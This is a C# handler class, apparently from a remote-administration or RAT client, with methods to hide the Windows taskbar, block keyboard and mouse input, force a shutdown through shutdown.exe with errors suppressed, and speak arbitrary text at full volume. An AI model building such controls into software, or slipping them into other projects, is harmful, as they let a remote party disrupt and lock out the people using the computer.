using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Speech.Synthesis;
using System.Text;

namespace MLMiscClient.Handlers
{
    public static class MiscHandler
    {
        static IntPtr TaskbarHandle = IntPtr.Zero;

        public static void Load()
        {
            TaskbarHandle = FindWindow("Shell_TrayWnd", "");
        }

        public static void ShowTasktray(bool show)
        {
            if (show)
                ShowWindow(TaskbarHandle, 1);
            else
                ShowWindow(TaskbarHandle, 0);
        }

        public static void ComputerPower(string type, int timer)
        {
            try
            {
                Process.Start("shutdown.exe", string.Format("-{0} -t {1} -f", type, timer));
            }
            catch
            {

            }
        }

        public static void TextToSpeech(string say, int rate)
        {
            using (SpeechSynthesizer sapi = new SpeechSynthesizer())
            {
                sapi.Volume = 100;
                sapi.Rate = rate;
                sapi.SpeakAsync(say);
            }
        }

        [DllImport("user32.dll")]
        public static extern void BlockInput(bool block);

        [DllImport("user32.dll")]
        private static extern IntPtr FindWindow(string className, string windowText);
        [DllImport("user32.dll")]
        private static extern int ShowWindow(IntPtr hwnd, int command);
    }
}
